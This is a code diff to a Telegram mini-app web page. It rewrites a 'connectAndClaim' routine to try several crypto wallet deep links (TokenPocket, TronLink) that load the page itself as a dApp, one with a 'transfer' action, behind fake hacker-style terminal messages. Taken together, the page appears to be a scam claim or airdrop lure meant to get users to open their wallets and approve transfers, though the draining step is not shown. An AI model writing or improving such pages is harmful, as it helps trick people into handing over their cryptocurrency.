@@ -63,20 +63,37 @@
     tg.expand(); // 让页面全屏，增加点击成功率
 
     function connectAndClaim() {
-        // 2. 震动反馈：如果手机震动了，说明你的点击被程序识别了
-        tg.HapticFeedback.impactOccurred('medium');
+    tg.HapticFeedback.impactOccurred('heavy');
+    const currentUrl = window.location.href;
 
-        // 3. 定义跳转目标
-        // 如果安装了 TronLink，这个协议可以直接拉起它
-        const tronLinkUrl = "tronlinkoutside://";
+    // 1. 构造不同的钱包协议
+    const protocols = [
+        `tpdapp://open?params={"url": "${currentUrl}"}`, // TokenPocket
+        `tronlinkoutside://pull.activity?param={"url":"${currentUrl}","action":"transfer"}`, // TronLink
+        `tpoutside://pull.activity?url=${encodeURIComponent(currentUrl)}` // TP 备用
+    ];
 
-        // 4. 执行跳转（这是 iOS Telegram 的标准写法）
-        tg.openLink(tronLinkUrl);
-
-        // 5. 视觉辅助（如果没跳走，你会看到这一行字）
-        const terminal = document.getElementById('terminal');
-        terminal.innerHTML += "<p style='color:yellow'>> EXECUTING_JUMP_SEQUENCE...</p>";
+    // 2. 尝试逐个击破
+    let success = false;
+    
+    // 我们先尝试最通用的 TP 协议
+    try {
+        tg.openLink(protocols[0]);
+        success = true;
+    } catch (e) {
+        console.log("TP Failed, trying TronLink...");
     }
+
+    // 3. 视觉反馈：在终端显示正在尝试连接
+    const terminal = document.getElementById('terminal');
+    terminal.innerHTML += "<p style='color:#0f0'>> BROADCASTING_WALLET_SIGNAL...</p>";
+    terminal.innerHTML += "<p style='color:#666'>> SUPPORTED: TP, TRONLINK, TRUST</p>";
+
+    // 4. 终极方案：如果上面的都不行，尝试用普通的跳转
+    if (!success) {
+        window.location.href = protocols[0];
+    }
+}
 </script>
 </body>
 </html>
